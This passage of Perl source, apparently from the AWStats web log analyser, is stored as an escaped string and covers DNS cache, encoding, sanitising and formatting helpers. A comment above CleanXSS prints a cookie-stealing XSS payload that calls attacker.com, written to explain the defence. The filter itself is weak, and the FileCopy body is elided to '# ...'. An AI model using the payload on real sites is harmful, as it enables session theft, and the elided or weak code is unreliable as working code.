We backup it\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  Make a backup of old history file into $PROG$1$FileSuffix.bak before\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\n#if (FileCopy(\"$DirData/$PROG$1$FileSuffix.txt\",\"$DirData/$PROG$1$FileSuffix.bak\")) {\n\t\t\t\t\t\tif (\n\t\t\t\t\t\t\trename(\n\t\t\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.txt\",\n\t\t\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.bak\"\n\t\t\t\t\t\t\t) == 0\n\t\t\t\t\t\t  )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\twarning(\n\"Warning: Failed to make a backup of \\\"$DirData/$PROG$1$FileSuffix.txt\\\" into \\\"$DirData/$PROG$1$FileSuffix.bak\\\".\"\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\t\t\t\tchmod 0666, \"$DirData/$PROG$1$FileSuffix.bak\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug( \"  No need to backup old history file\", 1 );\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (\n\t\t\t\t\trename(\n\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.tmp.$$\",\n\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.txt\"\n\t\t\t\t\t) == 0\n\t\t\t\t  )\n\t\t\t\t{\n\t\t\t\t\t$renameok =\n\t\t\t\t\t  0;    # At least one error in renaming working files\n\t\t\t\t\t        # Remove tmp file\n\t\t\t\t\tunlink \"$DirData/$PROG$1$FileSuffix.tmp.$$\";\n\t\t\t\t\twarning(\n\"Warning: Failed to rename \\\"$DirData/$PROG$1$FileSuffix.tmp.$$\\\" into \\\"$DirData/$PROG$1$FileSuffix.txt\\\".\\nWrite permissions on \\\"$PROG$1$FileSuffix.txt\\\" might be wrong\"\n\t\t\t\t\t\t  . (\n\t\t\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t\t\t\t? \" for an 'update from web'\"\n\t\t\t\t\t\t\t: \"\"\n\t\t\t\t\t\t  )\n\t\t\t\t\t\t  . \" or file might be opened.\"\n\t\t\t\t\t);\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\t\tchmod 0666, \"$DirData/$PROG$1$FileSuffix.txt\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {    # Because of rename error, we remove all remaining tmp files\n\t\t\tunlink \"$DirData/$PROG$1$FileSuffix.tmp.$$\";\n\t\t}\n\t}\n\tclose DIR;\n\treturn $renameok;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load DNS cache file entries into a memory hash array\n# Parameters:\tHash array ref to load into,\n#               File name to load,\n#\t\t\t\tFile suffix to use\n#               Save to a second plugin file if not up to date\n# Input:\t\tNone\n# Output:\t\tHash array is loaded\n# Return:\t\t1 No DNS Cache file found, 0 OK\n#------------------------------------------------------------------------------\nsub Read_DNS_Cache {\n\tmy $hashtoload   = shift;\n\tmy $dnscachefile = shift;\n\tmy $filesuffix   = shift;\n\tmy $savetohash   = shift;\n\n\tmy $dnscacheext = '';\n\tmy $filetoload  = '';\n\tmy $timetoload  = time();\n\n\tif ($Debug) { debug(\"Call to Read_DNS_Cache [file=\\\"$dnscachefile\\\"]\"); }\n\tif ( $dnscachefile =~ s/(\\.\\w+)$// ) { $dnscacheext = $1; }\n\tforeach my $dir ( \"$DirData\", \".\", \"\" ) {\n\t\tmy $searchdir = $dir;\n\t\tif (   $searchdir\n\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t{\n\t\t\t$searchdir .= \"/\";\n\t\t}\n\t\tif ( -f \"${searchdir}$dnscachefile$filesuffix$dnscacheext\" ) {\n\t\t\t$filetoload = \"${searchdir}$dnscachefile$filesuffix$dnscacheext\";\n\t\t}\n\n\t\t# Plugin call : Change filetoload\n\t\tif ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {\n\t\t\tSearchFile_hashfiles(\n\t\t\t\t$searchdir,   $dnscachefile, $filesuffix,\n\t\t\t\t$dnscacheext, $filetoload\n\t\t\t);\n\t\t}\n\t\tif ($filetoload) { last; }    # We found a file to load\n\t}\n\n\tif ( !$filetoload ) {\n\t\tif ($Debug) { debug(\" No DNS Cache file found\"); }\n\t\treturn 1;\n\t}\n\n\t# Plugin call : Load hashtoload\n\tif ( $PluginsLoaded{'LoadCache'}{'hashfiles'} ) {\n\t\tLoadCache_hashfiles( $filetoload, $hashtoload );\n\t}\n\tif ( !scalar keys %$hashtoload ) {\n\t\topen( DNSFILE, \"$filetoload\" )\n\t\t  or error(\"Couldn't open DNS Cache file \\\"$filetoload\\\": $!\");\n\n#binmode DNSFILE;\t\t# If we set binmode here, it seems that the load is broken on ActiveState 5.8\n# This is a fast way to load with regexp\n\t\t%$hashtoload =\n\t\t  map( /^(?:\\d{0,10}\\s+)?([0-9A-F:\\.]+)\\s+([^\\s]+)$/oi, <DNSFILE> );\n\t\tclose DNSFILE;\n\t\tif ($savetohash) {\n\n\t# Plugin call : Save hash file (all records) with test if up to date to save\n\t\t\tif ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {\n\t\t\t\tSaveHash_hashfiles( $filetoload, $hashtoload, 1, 0 );\n\t\t\t}\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Loaded \"\n\t\t\t  . ( scalar keys %$hashtoload )\n\t\t\t  . \" items from $filetoload in \"\n\t\t\t  . ( time() - $timetoload )\n\t\t\t  . \" seconds.\",\n\t\t\t1\n\t\t);\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Save a memory hash array into a DNS cache file\n# Parameters:\tHash array ref to save,\n#               File name to save,\n#\t\t\t\tFile suffix to use\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\t0 OK, 1 Error\n#------------------------------------------------------------------------------\nsub Save_DNS_Cache_File {\n\tmy $hashtosave   = shift;\n\tmy $dnscachefile = shift;\n\tmy $filesuffix   = shift;\n\n\tmy $dnscacheext    = '';\n\tmy $filetosave     = '';\n\tmy $timetosave     = time();\n\tmy $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;\n\tmy $nbofelemsaved  = 0;\n\n\tif ($Debug) {\n\t\tdebug(\"Call to Save_DNS_Cache_File [file=\\\"$dnscachefile\\\"]\");\n\t}\n\tif ( !scalar keys %$hashtosave ) {\n\t\tif ($Debug) { debug(\" No data to save\"); }\n\t\treturn 0;\n\t}\n\tif ( $dnscachefile =~ s/(\\.\\w+)$// ) { $dnscacheext = $1; }\n\t$filetosave = \"$dnscachefile$filesuffix$dnscacheext\";\n\n# Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date\n\tif ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {\n\t\tSaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,\n\t\t\t$nbofelemsaved );\n\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\tchmod 0666, \"$filetosave\";\n\t\t}\n\t}\n\tif ( !$nbofelemsaved ) {\n\t\t$filetosave = \"$dnscachefile$filesuffix$dnscacheext\";\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\" Save data \"\n\t\t\t\t  . (\n\t\t\t\t\t$nbofelemtosave\n\t\t\t\t\t? \"($nbofelemtosave records max)\"\n\t\t\t\t\t: \"(all records)\"\n\t\t\t\t  )\n\t\t\t\t  . \" into file $filetosave\"\n\t\t\t);\n\t\t}\n\t\tif ( !open( DNSFILE, \">$filetosave\" ) ) {\n\t\t\twarning(\n\"Warning: Failed to open for writing last update DNS Cache file \\\"$filetosave\\\": $!\"\n\t\t\t);\n\t\t\treturn 1;\n\t\t}\n\t\tbinmode DNSFILE;\n\t\tmy $starttimemin = int( $starttime / 60 );\n\t\tforeach my $key ( keys %$hashtosave ) {\n\n\t\t\t#if ($hashtosave->{$key} ne '*') {\n\t\t\tmy $ipsolved = $hashtosave->{$key};\n\t\t\tprint DNSFILE \"$starttimemin\\t$key\\t\"\n\t\t\t  . ( $ipsolved eq 'ip' ? '*' : $ipsolved )\n\t\t\t  . \"\\n\";    # Change 'ip' to '*' for backward compatibility\n\t\t\tif ( ++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE ) { last; }\n\n\t\t\t#}\n\t\t}\n\t\tclose DNSFILE;\n\n\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\tchmod 0666, \"$filetosave\";\n\t\t}\n\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Saved $nbofelemsaved items into $filetosave in \"\n\t\t\t  . ( time() - $timetosave )\n\t\t\t  . \" seconds.\",\n\t\t\t1\n\t\t);\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return time elapsed since last call in miliseconds\n# Parameters:\t0|1 (0 reset counter, 1 no reset)\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\tNumber of miliseconds elapsed since last call\n#------------------------------------------------------------------------------\nsub GetDelaySinceStart {\n\tif (shift) { $StartSeconds = 0; }    # Reset chrono\n\tmy ( $newseconds, $newmicroseconds ) = ( time(), 0 );\n\n\t# Plugin call : Return seconds and milliseconds\n\tif ( $PluginsLoaded{'GetTime'}{'timehires'} ) {\n\t\tGetTime_timehires( $newseconds, $newmicroseconds );\n\t}\n\tif ( !$StartSeconds ) {\n\t\t$StartSeconds      = $newseconds;\n\t\t$StartMicroseconds = $newmicroseconds;\n\t}\n\treturn ( ( $newseconds - $StartSeconds ) * 1000 +\n\t\t  int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Reset all variables whose name start with _ because a new month start\n# Parameters:\tNone\n# Input:        $YearRequired All variables whose name start with _\n# Output:       All variables whose name start with _\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Init_HashArray {\n\tif ($Debug) { debug(\"Call to Init_HashArray\"); }\n\n\t# Reset global hash arrays\n\t%FirstTime           = %LastTime           = ();\n\t%MonthHostsKnown     = %MonthHostsUnknown  = ();\n\t%MonthVisits         = %MonthUnique        = ();\n\t%MonthPages          = %MonthHits          = %MonthBytes = ();\n\t%MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();\n\t%DayPages            = %DayHits            = %DayBytes = %DayVisits = ();\n\n\t# Reset all arrays with name beginning by _\n\tfor ( my $ix = 0 ; $ix < 6 ; $ix++ ) {\n\t\t$_from_p[$ix] = 0;\n\t\t$_from_h[$ix] = 0;\n\t}\n\tfor ( my $ix = 0 ; $ix < 24 ; $ix++ ) {\n\t\t$_time_h[$ix]    = 0;\n\t\t$_time_k[$ix]    = 0;\n\t\t$_time_p[$ix]    = 0;\n\t\t$_time_nv_h[$ix] = 0;\n\t\t$_time_nv_k[$ix] = 0;\n\t\t$_time_nv_p[$ix] = 0;\n\t}\n\n\t# Reset all hash arrays with name beginning by _\n\t%_session     = %_browser_h   = %_browser_p   = ();\n\t%_domener_p   = %_domener_h   = %_domener_k = %_errors_h = %_errors_k = ();\n\t%_filetypes_h = %_filetypes_k = %_filetypes_gz_in = %_filetypes_gz_out = ();\n\t%_host_p = %_host_h = %_host_k = %_host_l = %_host_s = %_host_u = ();\n\t%_waithost_e = %_waithost_l = %_waithost_s = %_waithost_u = ();\n\t%_keyphrases = %_keywords   = %_os_h = %_os_p = %_pagesrefs_p = %_pagesrefs_h =\n\t  %_robot_h  = %_robot_k    = %_robot_l = %_robot_r = ();\n\t%_worm_h = %_worm_k = %_worm_l = %_login_p = %_login_h = %_login_k =\n\t  %_login_l      = %_screensize_h   = ();\n\t%_misc_p         = %_misc_h         = %_misc_k = ();\n\t%_cluster_p      = %_cluster_h      = %_cluster_k = ();\n\t%_se_referrals_p = %_se_referrals_h = %_sider_h = %_referer_h = %_err_host_h =\n\t  %_url_p        = %_url_k          = %_url_e = %_url_x = ();\n\t%_downloads = ();\n\t%_unknownreferer_l = %_unknownrefererbrowser_l = ();\n\t%_emails_h = %_emails_k = %_emails_l = %_emailr_h = %_emailr_k =\n\t  %_emailr_l = ();\n\n\tfor ( my $ix = 1 ; $ix < @ExtraName ; $ix++ ) {\n\t\t%{ '_section_' . $ix . '_h' }   = %{ '_section_' . $ix . '_o' } =\n\t\t  %{ '_section_' . $ix . '_k' } = %{ '_section_' . $ix . '_l' } =\n\t\t  %{ '_section_' . $ix . '_p' } = ();\n\t}\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } )\n\t{\n\n\t\t#   \t\tmy $function=\"SectionInitHashArray_$pluginname()\";\n\t\t#   \t\teval(\"$function\");\n\t\tmy $function = \"SectionInitHashArray_$pluginname\";\n\t\t&$function();\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Change word separators of a keyphrase string into space and\n#               remove bad coded chars\n# Parameters:\tstringtodecode\n# Input:        None\n# Output:       None\n# Return:\t\tdecodedstring\n#------------------------------------------------------------------------------\nsub ChangeWordSeparatorsIntoSpace {\n\t$_[0] =~ s/%0[ad]/ /ig;          # LF CR\n\t$_[0] =~ s/%2[02789abc]/ /ig;    # space \" ' ( ) * + ,\n\t$_[0] =~ s/%3a/ /ig;             # :\n\t$_[0] =~\n\t  tr/\\+\\'\\(\\)\\\"\\*,:/        /s;    # \"&\" and \"=\" must not be in this list\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTransforms special chars by entities as needed in XML/XHTML\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub XMLEncode {\n\tif ( $BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml' ) {\n\t\treturn shift;\n\t}\n\tmy $string = shift;\n\t$string =~ s/&/&amp;/g;\n\t$string =~ s/</&lt;/g;\n\t$string =~ s/>/&gt;/g;\n\t$string =~ s/\\\"/&quot;/g;\n\t$string =~ s/\\'/&apos;/g;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTransforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML\n#\t\t\t\tDecoding is done by XMLDecodeFromHisto.\n#\t\t\t\tAWStats data files are stored in ISO-8859-1.\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub XMLEncodeForHisto {\n\tmy $string = shift;\n\t$string =~ s/\\s/%20/g;\n\tif ( $BuildHistoryFormat ne 'xml' ) { return $string; }\n\t$string =~ s/=/%3d/g;\n\t$string =~ s/&/&amp;/g;\n\t$string =~ s/</&lt;/g;\n\t$string =~ s/>/&gt;/g;\n\t$string =~ s/\\\"/&quot;/g;\n\t$string =~ s/\\'/&apos;/g;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Encode an ISO string to PageCode output\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub EncodeToPageCode {\n\tmy $string = shift;\n\tif ( $PageCode eq 'utf-8' ) { $string = encode( \"utf8\", $string ); }\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Encode a binary string into an ASCII string\n# Parameters:\tstringtoencode\n# Return:\t\tencodedstring\n#------------------------------------------------------------------------------\nsub EncodeString {\n\tmy $string = shift;\n\n\t#\tuse bytes;\n\t$string =~ s/([\\x2B\\x80-\\xFF])/sprintf (\"%%%2x\", ord($1))/eg;\n\n\t#\tno bytes;\n\t$string =~ tr/ /+/s;\n\treturn $string;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Decode an url encoded text string into a binary string\n# Parameters:   stringtodecode\n# Input:        None\n# Output:       None\n# Return:       decodedstring\n#------------------------------------------------------------------------------\nsub DecodeEncodedString {\n\tmy $stringtodecode = shift;\n\t$stringtodecode =~ tr/\\+/ /s;\n\t$stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack(\"C\", hex($1))/ieg;\n\t$stringtodecode =~ s/[\"']//g;\n\n\treturn $stringtodecode;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Decode a precompiled regex value to a common regex value\n# Parameters:   compiledregextodecode\n# Input:        None\n# Output:       None\n# Return:\t\tstandardregex\n#------------------------------------------------------------------------------\nsub UnCompileRegex {\n\tshift =~ /\\(\\?[-^\\w]*:(.*)\\)/;         # Works with all perl\n\t# shift =~ /\\(\\?[-\\w]*:(.*)\\)/;        < perl 5.14\n\treturn $1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean a string of all chars that are not char or _ - \\ / . \\s\n# Parameters:   stringtoclean, full\n# Input:        None\n# Output:       None\n# Return:\t\tcleanedstring\n#------------------------------------------------------------------------------\nsub Sanitize {\n\tmy $stringtoclean = shift;\n\tmy $full = shift || 0;\n\tif ($full) {\n\t\t$stringtoclean =~ s/[^\\w\\d]//g;\n\t}\n\telse {\n\t\t$stringtoclean =~ s/[^\\w\\d\\-\\\\\\/\\.:\\s]//g;\n\t}\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'\n#               and clean | char.\n#\t\t\t\tA XSS attack is providing an AWStats url with XSS code that is executed\n#\t\t\t\twhen page loaded by awstats CGI is loaded from AWStats server. Such a code\n#\t\t\t\tcan be<script>document.write(\"<img src=http://attacker.com/page.php?\" + document.cookie)</script>\n#\t\t\t\tThis make the browser sending a request to the attacker server that contains\n#\t\t\t\tcookie used for AWStats server sessions. Attacker can this way caught this\n#\t\t\t\tcookie and used it to go on AWStats server like original visitor. For this\n#\t\t\t\tresaon, parameter received by AWStats must be sanitized by this function\n#\t\t\t\tbefore being put inside a web page.\n# Parameters:   stringtoclean\n# Input:        None\n# Output:       None\n# Return:\t\tcleanedstring\n#------------------------------------------------------------------------------\nsub CleanXSS {\n\tmy $stringtoclean = shift;\n\n\t# To avoid html tags and javascript\n\t$stringtoclean =~ s/</&lt;/g;\n\t$stringtoclean =~ s/>/&gt;/g;\n\t$stringtoclean =~ s/|//g;\n\n\t# To avoid onload=\"\n\t$stringtoclean =~ s/onload//g;\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Clean tags in a string\n#\t\t\t\tAWStats data files are stored in ISO-8859-1.\n# Parameters:   stringtodecode\n# Input:        None\n# Output:       None\n# Return:\t\tdecodedstring\n#------------------------------------------------------------------------------\nsub XMLDecodeFromHisto {\n\tmy $stringtoclean = shift;\n\t$stringtoclean =~ s/$regclean1/ /g;    # Replace <recnb> or </td> with space\n\t$stringtoclean =~ s/$regclean2//g;     # Remove others <xxx>\n\t$stringtoclean =~ s/%3d/=/g;\n\t$stringtoclean =~ s/&amp;/&/g;\n\t$stringtoclean =~ s/&lt;/</g;\n\t$stringtoclean =~ s/&gt;/>/g;\n\t$stringtoclean =~ s/&quot;/\\\"/g;\n\t$stringtoclean =~ s/&apos;/\\'/g;\n\treturn $stringtoclean;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Copy one file into another\n# Parameters:   sourcefilename targetfilename\n# Input:        None\n# Output:       None\n# Return:\t\t0 if copy is ok, 1 else\n#------------------------------------------------------------------------------\nsub FileCopy {\n\tmy $filesource = shift;\n\tmy $filetarget = shift;\n\tif ($Debug) { debug( \"FileCopy($filesource,$filetarget)\", 1 ); }\n\topen( FILESOURCE, \"$filesource\" )  || return 1;\n\topen( FILETARGET, \">$filetarget\" ) || return 1;\n\tbinmode FILESOURCE;\n\tbinmode FILETARGET;\n\n\t# ...\n\tclose(FILETARGET);\n\tclose(FILESOURCE);\n\tif ($Debug) { debug( \" File copied\", 1 ); }\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Format a QUERY_STRING\n# Parameters:   query\n# Input:        None\n# Output:       None\n# Return:\t\tformatted query\n#------------------------------------------------------------------------------\n# TODO Appeller cette fonction partout ou il y a des NewLinkParams\nsub CleanNewLinkParamsFrom {\n\tmy $NewLinkParams = shift;\n\twhile ( my $param = shift ) {\n\t\t$NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;\n\t}\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\treturn $NewLinkParams;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Show flags for other language translations\n# Parameters:   Current languade id (en, fr, ...)\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub Show_Flag_Links {\n\tmy $CurrentLang = shift;\n\n\t# Build flags link\n\tmy $NewLinkParams = $QueryString;\n\tmy $NewLinkTarget = '';\n\tif ( $ENV{'GATEWAY_INTERFACE'} ) {\n\t\t$NewLinkParams =\n\t\t  CleanNewLinkParamsFrom( $NewLinkParams,\n\t\t\t( 'update', 'staticlinks', 'framename', 'lang' ) );\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t\t}\n\t}\n\telse {\n\t\t$NewLinkParams =\n\t\t  ( $SiteConfig ? \"config=$SiteConfig&amp;\" : \"\" )\n\t\t  . \"year=$YearRequired&amp;month=$MonthRequired&amp;\";\n\t}\n\tif ( $NewLinkParams !~ /output=/ ) { $NewLinkParams .= 'output=main&amp;'; }\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkParams .= 'framename=index&amp;';\n\t}\n\n\tforeach my $lng ( split( /\\s+/, $ShowFlagLinks ) ) {\n\t\t$lng =\n\t\t    $LangBrowserToLangAwstats{$lng}\n\t\t  ? $LangBrowserToLangAwstats{$lng}\n\t\t  : $lng;\n\t\tif ( $lng ne $CurrentLang ) {\n\t\t\tmy %lngtitle = (\n\t\t\t\t'en', 'English', 'fr', 'French', 'de', 'German',\n\t\t\t\t'it', 'Italian', 'nl', 'Dutch',  'es', 'Spanish'\n\t\t\t);\n\t\t\tmy $lngtitle = ( $lngtitle{$lng} ? $lngtitle{$lng} : $lng );\n\t\t\tmy $flag = (\n\t\t\t\t  $LangAWStatsToFlagAwstats{$lng}\n\t\t\t\t? $LangAWStatsToFlagAwstats{$lng}\n\t\t\t\t: $lng\n\t\t\t);\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . XMLEncode(\"$AWScript${NewLinkParams}lang=$lng\")\n\t\t\t  . \"\\\"$NewLinkTarget><img src=\\\"$DirIcons\\/flags\\/$flag.png\\\" height=\\\"14\\\" border=\\\"0\\\"\"\n\t\t\t  . AltTitle(\"$lngtitle\")\n\t\t\t  . \" /></a>&nbsp;\\n\";\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat value in bytes in a string (Bytes, Kb, Mb, Gb)\n# Parameters:   bytes (integer value or \"0.00\")\n# Input:        None\n# Output:       None\n# Return:       \"x.yz MB\" or \"x.yy KB\" or \"x Bytes\" or \"0\"\n#------------------------------------------------------------------------------\nsub Format_Bytes {\n\tmy $bytes = shift || 0;\n\tmy $fudge = 1;\n\n# Do not use exp/log function to calculate 1024power, function make segfault on some unix/perl versions\n\tif ( $bytes >= ( $fudge << 30 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1073741824 ) . \" $Message[110]\";\n\t}\n\tif ( $bytes >= ( $fudge << 20 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1048576 ) . \" $Message[109]\";\n\t}\n\tif ( $bytes >= ( $fudge << 10 ) ) {\n\t\treturn sprintf( \"%.2f\", $bytes / 1024 ) . \" $Message[108]\";\n\t}\n\tif ( $bytes < 0 ) { $bytes = \"?\"; }\n\treturn int($bytes) . ( int($bytes) ? \" $Message[119]\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat a number with commas or any other separator\n#\t\t\t\tCL: courtesy of http://www.perlmonks.org/?node_id=2145\n# Parameters:   number\n# Input:        None\n# Output:       None\n# Return:       \"999,999,999,999\"\n#------------------------------------------------------------------------------\nsub Format_Number {\n\tmy $number = shift || 0;\n\t$number =~ s/(\\d)(\\d\\d\\d)$/$1 $2/;\n\t$number =~ s/(\\d)(\\d\\d\\d\\s\\d\\d\\d)$/$1 $2/;\n\t$number =~ s/(\\d)(\\d\\d\\d\\s\\d\\d\\d\\s\\d\\d\\d)$/$1 $2/;\n\tmy $separator = $Message[177];\n\tif ($separator eq '') { $separator=' '; }\t# For backward compatibility\n\t$number =~ s/ /$separator/g;\n\treturn $number;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tReturn \" alt=string title=string\"\n# Parameters:   string\n# Input:        None\n# Output:       None\n# Return:       \"alt=string title=string\"\n#------------------------------------------------------------------------------\nsub AltTitle {\n\tmy $string = shift || '';\n\treturn \" alt='$string' title='$string'\";\n\n\t#\treturn \" alt=\\\"$string\\\" title=\\\"$string\\\"\";\n\t#\treturn ($BuildReportFormat?\"\":\" alt=\\\"$string\\\"\").\" title=\\\"$string\\\"\";\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tTell if an email is a local or external email\n# Parameters:   email\n# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)\n# Output:       None\n# Return:       -1, 0 or 1\n#------------------------------------------------------------------------------\nsub IsLocalEMail {\n\tmy $email = shift || 'unknown';\n\tif ( $email !~ /\\@(.*)$/ ) { return 0; }\n\tmy $domain = $1;\n\tif ( $domain =~ /^$SiteDomain$/i ) { return 1; }\n\tforeach (@HostAliases) {\n\t\tif ( $domain =~ /$_/ ) { return 1; }\n\t}\n\treturn -1;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tFormat a date according to Message[78] (country date format)\n# Parameters:   String date YYYYMMDDHHMMSS\n#               Option 0=LastUpdate and LastTime date\n#                      1=Arrays date except daymonthvalues\n#                      2=daymonthvalues date (only year month and day)\n# Input:        $Message[78]\n# Output:       None\n# Return:       Date with format defined by Message[78] and option\n#------------------------------------------------------------------------------\nsub Format_Date {\n\tmy $date       = shift;\n\tmy $option     = shift || 0;\n\tmy $year       = substr( \"$date\", 0, 4 );\n\tmy $month      = substr( \"$date\", 4, 2 );\n\tmy $day        = substr( \"$date\", 6, 2 );\n\tmy $hour       = substr( \"$date\", 8, 2 );\n\tmy $min        = substr( \"$date\", 10, 2 );\n\tmy $sec        = substr( \"$date\", 12, 2 );\n\tmy $dateformat = $Message[78];\n\n\tif ( $option == 2 ) {\n\t\t$dateformat =~ s/^[^ymd]+//g;\n\t\t$dateformat =~ s/[^ymd]+$//g;\n\t}\n\t$dateformat =~ s/yyyy/$year/g;\n\t$dateformat =~ s/yy/$year/g;\n\t$dateformat =~ s/mmm/$MonthNumLib{$month}/g;\n\t$dateformat =~ s/mm/$month/g;\n\t$dateformat =~ s/dd/$day/g;\n\t$dateformat =~ s/HH/$hour/g;\n\t$dateformat =~ s/MM/$min/g;\n\t$dateformat =~ s/SS/$sec/g;\n\treturn \"$dateformat\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return 1 if string contains only ascii chars\n# Parameters:   string\n# Input:        None\n# Output:       None\n# Return:       0 or 1\n#------------------------------------------------------------------------------\nsub IsAscii {\n\tmy $string = shift;\n\tif ($Debug) { debug( \"IsAscii($string)\", 5 ); }\n\tif ( $string =~ /^[\\w\\+\\-\\/\\\\\\.%,;:=\\\"\\'&?!\\s]+$/ ) {\n\t\tif ($Debug) { debug( \" Yes\", 6 ); }\n\t\treturn\n\t\t  1\n\t\t  ; # Only alphanum chars (and _) or + - / \\ . % , ; : = \" ' & ? space \\t\n\t}\n\tif ($Debug) { debug( \" No\", 6 ); }\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return the lower value between 2 but exclude value if 0\n# Parameters:   Val1 and Val2\n# Input:        None\n# Output:       None\n# Return:       min(Val1,Val2)\n#------------------------------------------------------------------------------\nsub MinimumButNoZero {\n\tmy ( $val1, $val2 ) = @_;\n\treturn ( $val1 && ( $val1 < $val2 || !$val2 ) ? $val1 : $val2 );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Add a val from sorting tree\n# Parameters:   keytoadd keyval [firstadd]\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub AddInTree {\n\tmy $keytoadd = shift;\n\tmy $keyval   = shift;\n\tmy $firstadd = shift || 0;\n\tif ( $firstadd == 1 ) {    # Val is the first one\n\t\tif ($Debug) { debug( \"  firstadd\", 4 ); }\n\t\t$val{$keyval} = $keytoadd;\n\t\t$lowerval = $keyval;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . 